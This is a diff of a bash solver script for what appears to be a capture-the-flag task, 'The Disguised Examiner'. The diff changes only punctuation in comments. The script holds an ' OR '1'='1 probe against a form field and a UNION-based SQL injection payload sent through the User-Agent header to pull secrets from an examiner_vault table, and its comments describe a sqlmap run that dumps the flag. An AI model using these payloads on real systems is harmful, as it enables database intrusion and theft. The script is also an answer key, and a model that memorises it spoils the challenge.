@@ -1,8 +1,8 @@
 #!/usr/bin/env bash
-# solvers/p2_3.sh — Task 2.3 "The Disguised Examiner" canonical exploit.
+# solvers/p2_3.sh, Task 2.3 "The Disguised Examiner" canonical exploit.
 #
-# Unlike p2_1/p2_2, the visible surface on this floor — an examiner
-# check-in form (`badge_id`) — is genuinely, fully parameterized. There is
+# Unlike p2_1/p2_2, the visible surface on this floor, an examiner
+# check-in form (`badge_id`), is genuinely, fully parameterized. There is
 # no injection reachable through anything the page's own form submits.
 # The real, hidden injection point is the `User-Agent` HTTP header: every
 # visit is queried back by that header's value to render a "recent
@@ -10,12 +10,12 @@
 # string concatenation.
 #
 # This script demonstrates the exploit two ways:
-#   1. A hand-rolled `curl -A` UNION-based extraction — deterministic and
-#      fast, this is what the pass/fail assertion below is based on.
+#   1. A hand-rolled `curl -A` UNION-based extraction, deterministic and
+#      fast; this is what the pass/fail assertion below is based on.
 #   2. A real sqlmap run against a saved request file with the
 #      `User-Agent` header explicitly marked with sqlmap's `*` injection
 #      marker (the same effect `--level 3` gives you automatically,
-#      demonstrated here for auditability/repeatability) — confirming the
+#      demonstrated here for auditability/repeatability), confirming the
 #      same header is what sqlmap itself identifies as the injectable
 #      parameter, then dumping the flag through it.
 #
@@ -34,15 +34,15 @@ trap 'rm -rf "$WORKDIR"' EXIT
 
 # --- Part 1: prove the visible form field is a dead end -------------------
 # A textbook injection attempt against the form's own `badge_id` parameter
-# must fail — it's parameterized, this is the red herring.
+# must fail: it's parameterized, this is the red herring.
 echo "[p2_3] sanity check: badge_id is NOT injectable (expected to be safe)"
 FORM_PROBE=$(curl -s -A "seiyaku-arc-solver" \
     --get "${BASE}/p2/examiner" --data-urlencode "badge_id=HA-014' OR '1'='1")
 if echo "$FORM_PROBE" | grep -qF "$FLAG"; then
-    echo "[p2_3] unexpected: flag leaked through badge_id — form should be safe"
+    echo "[p2_3] unexpected: flag leaked through badge_id, form should be safe"
 fi
 
-# --- Part 2: the real exploit — UNION-based injection via User-Agent ------
+# --- Part 2: the real exploit, UNION-based injection via User-Agent ------
 UA_PAYLOAD="x' UNION SELECT id, secret, codename FROM examiner_vault-- -"
 
 echo "[p2_3] exploiting the real injection point: the User-Agent header"
